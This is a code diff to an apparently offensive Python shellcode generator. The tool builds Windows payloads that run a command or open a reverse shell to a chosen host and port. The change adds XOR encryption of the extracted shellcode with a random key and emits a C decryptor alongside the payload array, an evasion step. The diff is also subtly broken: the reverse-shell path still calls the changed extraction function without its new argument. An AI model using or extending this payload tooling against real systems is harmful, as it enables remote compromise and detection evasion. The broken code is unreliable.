@@ -4,6 +4,7 @@ import os
 import glob
 import time
 import pefile
+import random
 
 
 def main():
@@ -16,6 +17,7 @@ def main():
     parser.add_argument( "-cl", "--clean", help="Clean the top level directory, removes all files except this py script and peb_structs.h", action="store_true" )
     parser.add_argument( "-host", "--host", help="Specify the IP address or hostname for reverse shell" )
     parser.add_argument( "-port", "--port", help="Specify the port for reverse shell" )
+    parser.add_argument( "-e", "--enc", choices=['xor', 'b64'], help="Specify the encoding/encryption type" )
     args = parser.parse_args()
 
     if args.clean:
@@ -29,7 +31,11 @@ def main():
         if not args.command:
             parser.error( "The --command argument is required when mode is 'cmd' or 'ps'." )
 
-        cmd( args.command )
+        if not args.enc:
+            cmd( args.command, None)
+        
+        else:
+            cmd( args.command, args.enc )
     
     #
     # FUNCTION TO HANDLE PS COMMAND EXECUTION
@@ -58,8 +64,10 @@ def main():
 # HANDLES USER COMMAND INPUT AND GENERATES THE 
 # SHELLCODE TO EXECUTE THE COMMAND IN COMMAND PROMPT
 # 
-def cmd( command ):
+def cmd( command, encryption_type ):
     print( f"[+] Generating shellcode to execute: {command} in command prompt" )
+    if encryption_type:
+        print( f"[+] Shellcode will be encrypted via {encryption_type}" )
     
     #
     # MAKE THE DESIRED COMMAND INTO STACK STRING FORMAT
@@ -106,7 +114,7 @@ def cmd( command ):
     #
     # EXTRACT BYTES FROM EXECUTABLE
     #
-    extract_shellcode()
+    extract_shellcode( encryption_type )
 
 
 
@@ -200,7 +208,7 @@ def rev_shell( in_address, in_port ):
         print( f"[!] An error occurred: {e}" )
 
     time.sleep(1)
-    
+
     #
     # COMPILE THE FILE
     #
@@ -220,6 +228,7 @@ def rev_shell( in_address, in_port ):
     # EXTRACT BYTES FROM SHELLCODE
     #
     extract_shellcode()    
+
 
 
 #
@@ -370,7 +379,7 @@ def fix_assembly():
 # EXTRACT SHELLCODE FROM THE EXECUTABLE AND PRESENT 
 # IT IN A FORMAT THAT THE USER CAN COPY AND PASTE
 #
-def extract_shellcode():
+def extract_shellcode( encryption_type ):
     pe = pefile.PE( "fixed_main.exe" )
     text_section = next((s for s in pe.sections if s.Name.decode().strip('\x00') == '.text'), None)
     
@@ -380,13 +389,44 @@ def extract_shellcode():
 
     text_bytes = text_section.get_data()
 
-    c_array = ', '.join( f'0x{byte:02x}' for byte in text_bytes )
-    formatted_c_array = f'unsigned char payload[] = {{ {c_array} }};'
-
     print( "[+] Successfully extracted .text section from the executable" )
 
-    with open( "shellcode.text", "w" ) as file:
-        file.write( formatted_c_array + "\n" )
+    if encryption_type == "xor":
+        print( "[+] XOR encrypting the shellcode!" )
+        key = random.randint( 0x01, 0xFF )
+
+        i = 0
+        for byte in text_bytes:
+            if i == 5:
+                break
+            print( f"[+] First byte check: 0x{byte:02x}" )
+            i += 1
+
+        print( f"[+] XOR generated key: 0x{key:02x}" )
+
+        for byte in text_bytes:
+            encrypted_bytes = bytes( [byte ^ key for byte in text_bytes] )
+
+        with open( "shellcode.text", "w" ) as file, open( "code_templates/xor_decrypt.c", "r" ) as src_file:
+            for line in src_file:
+                if "unsigned char key =" in line:
+                    replacement_line = "\tunsigned char key = " + f"0x{key:02x}; // This is the generated key!" 
+                    file.write( replacement_line ) 
+                    continue
+                
+                file.write( line )
+            
+            file.write( "\n\n" )
+
+            c_array = ', '.join( f'0x{byte:02x}' for byte in encrypted_bytes )
+            formatted_c_array = f'unsigned char payload[] = {{ {c_array} }};'
+            file.write( formatted_c_array + "\n" )
+
+    else:
+        with open( "shellcode.text", "w" ) as file:
+            c_array = ', '.join( f'0x{byte:02x}' for byte in text_bytes )
+            formatted_c_array = f'unsigned char payload[] = {{ {c_array} }};'
+            file.write( formatted_c_array + "\n" )
     
     time.sleep(1)
 
